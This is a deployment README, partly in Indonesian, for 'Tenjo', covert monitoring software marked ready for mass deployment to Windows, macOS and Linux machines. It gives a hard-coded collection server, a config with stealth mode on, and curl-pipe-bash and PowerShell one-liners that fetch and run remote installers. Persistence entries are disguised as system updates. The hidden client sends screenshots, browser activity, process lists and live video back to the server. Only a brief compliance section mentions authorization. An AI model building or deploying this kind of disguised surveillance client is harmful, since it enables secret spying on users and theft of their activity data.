# 🌐 TENJO PRODUCTION CONFIGURATION - FINAL

## 📡 Production Server Details

### 🎯 **Server Information:**
- **Production IP**: `103.129.149.67`
- **Server URL**: `http://103.129.149.67`
- **API Endpoint**: `http://103.129.149.67/api`
- **Protocol**: HTTP (port 8000)

### 🔧 **Client Configuration:**
```python
# Production Configuration (client/src/core/config.py)
SERVER_URL = "http://103.129.149.67"
STEALTH_MODE = True
LOG_LEVEL = "ERROR"
BROWSER_CHECK_INTERVAL = 60  # seconds (increased for stealth)
PROCESS_CHECK_INTERVAL = 90  # seconds (increased for stealth)
```

## 🚀 **Deployment Ready**

### ✅ **Configuration Status:**
- ✅ Production server IP configured
- ✅ Stealth mode enabled  
- ✅ Error-level logging only
- ✅ Auto-start services ready
- ✅ Cross-platform installers ready

### 📦 **Installer Files Ready:**
1. **macOS**: `install_macos_production.sh`
2. **Windows**: `install_windows_production.bat`
3. **Linux**: `install_linux_production.sh`

### 🔗 **Deployment Commands:**

#### macOS Deployment:
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/install_macos_production.sh | bash
```

#### Windows Deployment:
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/install_windows_production.bat' -OutFile 'install_tenjo.bat'; .\install_tenjo.bat"
```

#### Linux Deployment:
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/install_linux_production.sh | bash
```

## 🔒 **Security & Stealth Features**

### 🕵️ **Stealth Operation:**
- **Hidden Installation**: `~/.tenjo` (dot-directory)
- **Background Service**: No visible UI elements
- **Generic Process**: `python3 main.py` (tidak mencurigakan)
- **Minimal Logging**: Error level only
- **Silent Errors**: No error dialogs ke user

### 🔄 **Auto-Start Configuration:**
- **macOS**: LaunchAgent `com.apple.system.update`
- **Windows**: Scheduled Task `SystemUpdateChecker`
- **Linux**: systemd service `system-update`

## 📊 **Expected Performance**

### 🎯 **Resource Usage:**
- **CPU**: < 2% (background operation)
- **Memory**: < 50MB (minimal footprint)
- **Network**: Minimal (efficient data transmission)
- **Disk**: < 100MB (installation + logs)

### 📡 **Network Communication:**
- **Server**: `103.129.149.67`
- **Protocols**: HTTP REST API
- **Data**: Screenshots, browser activity, system info
- **Frequency**: Smart capture (only when browsers active)

## 🎯 **Production Workflow**

### 1. **Client Registration:**
```json
{
  "client_id": "auto-generated-uuid",
  "hostname": "target-machine-name",
  "ip_address": "client-real-ip",
  "os_info": {
    "name": "Windows 11 Pro / macOS Sequoia / Ubuntu 22.04",
    "version": "detailed-version",
    "architecture": "AMD64 / arm64 / x86_64"
  }
}
```

### 2. **Monitoring Features:**
- ✅ **Real-time Screenshots** (setiap 60 detik)
- ✅ **Browser Activity Tracking** (Chrome, Firefox, Safari, Edge)
- ✅ **Process Monitoring** (aplikasi yang berjalan)
- ✅ **Live Video Streaming** (on-demand)
- ✅ **System Information** (OS, hardware, network)

### 3. **Dashboard Access:**
- **URL**: `http://103.129.149.67`
- **Features**: Client management, live monitoring, reports
- **Real-time**: Live video streaming, activity tracking

## ⚠️ **Important Production Notes**

### 🔐 **Security Considerations:**
- **User Permissions**: Services run with user-level privileges (tidak perlu admin)
- **Data Transmission**: HTTP (consider HTTPS untuk production yang lebih secure)
- **Local Storage**: Logs dan data tersimpan lokal sebelum dikirim
- **Clean Uninstall**: Complete removal tanpa traces

### 📋 **Compliance:**
- **Authorization Required**: Pastikan deployment sesuai kebijakan perusahaan
- **Privacy Laws**: Comply dengan regulasi privacy lokal
- **Employee Notification**: Sesuai requirement legal

### 🧪 **Pre-Deployment Testing:**
1. Test installer di environment test terlebih dahulu
2. Verify koneksi ke production server
3. Test stealth operation
4. Verify auto-start functionality
5. Test uninstall process

## 🎉 **READY FOR PRODUCTION DEPLOYMENT!**

Configuration lengkap telah disiapkan untuk deployment ke:
- **Corporate Windows workstations**
- **macOS corporate devices**
- **Linux servers/workstations**

Semua client akan otomatis connect ke production server `103.129.149.67` dengan full stealth operation.

---

**Last Updated**: September 20, 2025  
**Production Server**: 103.129.149.67  
**Status**: ✅ Ready for Mass Deployment